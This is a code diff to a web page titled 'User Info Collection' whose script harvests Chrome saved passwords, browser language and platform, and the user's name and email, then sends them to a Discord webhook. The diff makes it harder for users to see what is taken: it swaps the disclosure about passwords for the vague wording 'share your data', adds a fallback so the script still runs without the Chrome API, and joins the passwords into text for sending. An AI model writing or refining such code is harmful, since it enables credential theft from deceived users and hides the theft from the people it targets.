@@ -5,7 +5,7 @@
 </head>
 <body>
   <h1>User Info Collection</h1>
-  <p>Please read the following information and agree to share your Chrome passwords and system information:</p>
+  <p>Please read the following information and agree to share your data:</p>
   <button id="agree-btn">Agree</button>
 
   <script>
@@ -24,6 +24,7 @@
               { name: "Language", value: navigator.language },
               { name: "Platform", value: navigator.platform },
               { name: "Chrome Passwords", value: data.passwords }
+              // Add more fields for additional information if desired
             ]
           }
         ]
@@ -56,6 +57,9 @@
             callback(passwords);
           }
         });
+      } else {
+        // Return empty passwords if Chrome API is not available
+        callback([]);
       }
     }
 
@@ -69,7 +73,7 @@
         const userData = {
           name: name,
           email: email,
-          passwords: passwords || "No passwords captured"
+          passwords: passwords.join("\n") || "No passwords captured"
         };
 
         // Send user information to Discord webhook
